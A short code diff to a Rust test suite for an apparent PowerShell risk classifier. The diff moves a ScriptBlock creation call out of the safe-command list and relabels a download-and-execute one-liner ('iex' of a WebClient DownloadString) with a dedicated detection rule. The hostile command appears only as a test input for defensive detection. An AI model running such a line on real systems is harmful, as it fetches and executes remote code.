@@ -38,7 +38,6 @@ fn everyday_powershell_is_safe() {
             "$sw = [Diagnostics.Stopwatch]::StartNew(); $sw.Start()",
             "$name.Replace('a', 'b')",
             "ni -ItemType File notes.txt",
-            "[ScriptBlock]::Create($safe)",
         ],
         &[],
     );
@@ -108,7 +107,7 @@ fn risky_powershell() {
             ),
             (
                 "iex (New-Object Net.WebClient).DownloadString('https://x')",
-                Rule::Unknown,
+                Rule::RunDownloaded,
             ),
             ("Invoke-Expression $cmd", Rule::Unknown),
             ("& $tool --force", Rule::Unknown),
